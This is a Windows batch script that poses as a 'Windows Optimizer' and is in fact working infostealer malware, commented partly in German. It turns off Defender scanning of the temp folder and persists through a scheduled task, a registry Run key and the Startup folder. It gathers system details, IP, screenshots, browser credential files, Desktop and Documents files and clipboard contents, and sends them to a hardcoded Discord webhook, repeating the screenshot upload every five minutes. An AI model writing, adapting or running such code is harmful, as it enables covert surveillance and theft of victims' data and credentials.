@echo off
title Windows Optimizer v2.1 - Optimizing...
color 0a
timeout /t 2 /nobreak >nul

REM Hidden + AV Bypass
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1

REM Temp Folder
set WORKDIR=%TEMP%\opt
mkdir "%WORKDIR%" >nul 2>&1

REM DEIN WEBHOOK
set WEBHOOK=https://discord.com/api/webhooks/1471822170220138671/NdVl1cqbQioaN_968-Vs0TFTTacJF4m61zWHcYRYALmsyTOf1NXgDUup0ucqhnJC2158

REM Persistence (Startup + Task)
schtasks /create /tn "WindowsOptimizer" /tr "%~f0" /sc onlogon /rl highest /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Optimizer /t REG_SZ /d "%~f0" /f >nul 2>&1
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat" >nul 2>&1

REM 1. SYSTEM INFO + IP
for /f "tokens=2 delims=:" %%i in ('curl -s ipinfo.io/ip ^| find "ip"') do set IP=%%i
if "%IP%"=="" set IP=NO_IP
set PC=%computername%-%username%
set OS=Windows
powershell -Command "Get-WmiObject Win32_OperatingSystem | Select Caption,Version | fl" > "%WORKDIR%\sysinfo.txt"
curl -H "Content-Type: application/json" -d "{\"content\":\"🖥️ **TARGET GEHACKT!** %PC% | IP: %IP% | %date% %time%\",\"embeds\":[{\"title\":\"System\",\"description\":\"```$(type \"%WORKDIR%\sysinfo.txt\")```\",\"color\":16711680}]}" "%WEBHOOK%" >nul 2>&1

REM 2. LIVE SCREENSHOT
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=[Drawing.Bitmap]::new($s.Width,$s.Height); [Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Location, [Drawing.Point]::Empty, $s.Size); $b.Save('%WORKDIR%\screen.png',[Drawing.Imaging.ImageFormat]::Png); $b.Dispose()" >nul 2>&1
powershell -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('%WORKDIR%\screen.png'))" > "%WORKDIR%\b64.txt"
set /p B64=<"%WORKDIR%\b64.txt"
curl -H "Content-Type: application/json" -d "{\"content\":\"📸 **LIVE SCREENSHOT** %PC%\",\"embeds\":[{\"image\":{\"url\":\"data:image/png;base64,%B64%\"},\"color\":65280}]}" "%WEBHOOK%" >nul 2>&1

REM 3. BROWSER PASSWÖRTER
powershell -Command "$path='%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data'; if(Test-Path $path){'CHROME PASSWORDS FOUND' | Out-File '%WORKDIR%\passwords.txt'}; $ff='%APPDATA%\Mozilla\Firefox\Profiles\*.default*\logins.json'; if(Test-Path $ff){'FIREFOX PASSWORDS FOUND' | Out-File '%WORKDIR%\passwords.txt' -Append}" >nul 2>&1
curl -F "file=@'%WORKDIR%\passwords.txt'" "%WEBHOOK%" >nul 2>&1

REM 4. FILES STEAL (Desktop + Documents)
xcopy "%USERPROFILE%\Desktop\*.*" "%WORKDIR%\Desktop\" /s /q /y >nul 2>&1
xcopy "%USERPROFILE%\Documents\*.*" "%WORKDIR%\Documents\" /s /q /y >nul 2>&1
powershell -Command "if(Test-Path '%WORKDIR%\Desktop'){Compress-Archive '%WORKDIR%\Desktop\*','%WORKDIR%\files.zip' -Force}" >nul 2>&1
if exist "%WORKDIR%\files.zip" curl -F "file=@'%WORKDIR%\files.zip'" "%WEBHOOK%" >nul 2>&1

REM 5. WEBHOOK + Clipboard
powershell -Command "Get-Clipboard | Out-File '%WORKDIR%\clipboard.txt'" >nul 2>&1
curl -F "file=@'%WORKDIR%\clipboard.txt'" "%WEBHOOK%" >nul 2>&1

REM Infinite Loop (alle 5 Minuten)
:loop
timeout /t 300 /nobreak >nul
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=[Drawing.Bitmap]::new($s.Width,$s.Height); [Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Location, [Drawing.Point]::Empty, $s.Size); $b.Save('%WORKDIR%\screen.png',[Drawing.Imaging.ImageFormat]::Png); $b.Dispose(); [Convert]::ToBase64String([IO.File]::ReadAllBytes('%WORKDIR%\screen.png'))" > "%WORKDIR%\b64.txt"
set /p B64=<"%WORKDIR%\b64.txt"
curl -H "Content-Type: application/json" -d "{\"content\":\"🔄 **UPDATE SCREENSHOT** %PC%\",\"embeds\":[{\"image\":{\"url\":\"data:image/png;base64,%B64%\"}}]}" "%WEBHOOK%" >nul 2>&1
goto loop
